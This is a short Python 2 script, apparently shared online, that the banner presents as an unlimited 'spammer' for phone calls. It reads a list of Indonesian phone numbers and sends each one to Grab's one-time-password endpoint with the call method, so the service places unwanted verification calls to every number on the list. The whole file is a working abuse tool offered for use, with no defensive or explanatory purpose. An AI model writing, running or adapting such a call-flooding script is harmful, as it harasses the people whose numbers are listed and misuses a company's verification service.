import os
from time import sleep
try:
    import requests
except:
    os.system("pip2 install requests;pip install requests")
print """
    [ spammer grab python version
    [ type spam : telepon
    [ unlimited : yes
    [ author    : 407AEx
    [ coded by  : Deray
"""
no=raw_input("- list of no: ")
try:
    b=open(no).readlines()
except:
    print "- failed to open:",no
    exit()
for x in b:
    nos=x.replace("08","628").replace("\n","")
    req= requests.post("https://api.grab.com/grabid/v1/phone/otp",data={"method":"CALL","countryCode":"id","phoneNumber":nos,"templateID":"pax_android_production"}).text
    if req !="errors":
        print "+ sending ok: "+str(nos)
    else:
        print "- send failed: "+str(nos)
print "- finished."
